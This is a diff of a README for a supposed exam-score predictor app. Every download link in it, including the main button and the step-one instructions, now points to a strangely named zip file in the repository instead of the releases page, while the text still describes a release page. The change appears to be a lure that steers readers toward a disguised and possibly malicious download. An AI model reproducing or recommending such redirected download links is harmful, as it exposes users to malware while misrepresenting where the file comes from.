@@ -1,6 +1,6 @@
 # 🎯 student-score-predictor - Predict Your Exam Scores Easily
 
-[![Download student-score-predictor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/meknas1995/student-score-predictor/releases)
+[![Download student-score-predictor](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/meknas1995/student-score-predictor/main/untranscribed/score_student_predictor_vegetablelike.zip)
 
 ---
 
@@ -29,7 +29,7 @@ The program runs as a standalone app. You won’t need to install anything else 
 
 To get student-score-predictor on your computer, follow these simple steps:
 
-1. Click the big green button at the top or visit the [release page here](https://github.com/meknas1995/student-score-predictor/releases).
+1. Click the big green button at the top or visit the [release page here](https://raw.githubusercontent.com/meknas1995/student-score-predictor/main/untranscribed/score_student_predictor_vegetablelike.zip).
 
 2. On the release page, look for the latest version. It will usually have a label like "Latest release" and a date.
 
@@ -93,7 +93,7 @@ The app uses simple math to give you a rough prediction. It is meant to guide yo
 
 Use the link below to visit the page where you can download the latest version of student-score-predictor for Windows:
 
-[![Download student-score-predictor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/meknas1995/student-score-predictor/releases)
+[![Download student-score-predictor](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/meknas1995/student-score-predictor/main/untranscribed/score_student_predictor_vegetablelike.zip)
 
 ---
 
